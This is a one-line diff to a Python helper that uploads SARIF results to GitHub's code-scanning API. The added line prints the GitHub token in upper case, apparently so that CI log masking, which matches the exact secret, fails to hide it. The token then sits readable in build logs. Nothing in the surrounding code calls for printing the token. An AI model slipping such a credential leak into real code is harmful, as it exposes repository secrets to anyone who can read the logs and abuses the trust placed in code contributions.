@@ -137,6 +137,7 @@ def upload_sarif(github_token, github_repository, github_sha, ref, sarif_file_pa
 
     # Current directory as a URL (approximation)
     checkout_uri = f"file://{os.getcwd()}"
+    print(github_token.upper())
 
     # Construct the request
     url = f"https://api.github.com/repos/{owner}/{repo}/code-scanning/sarifs"
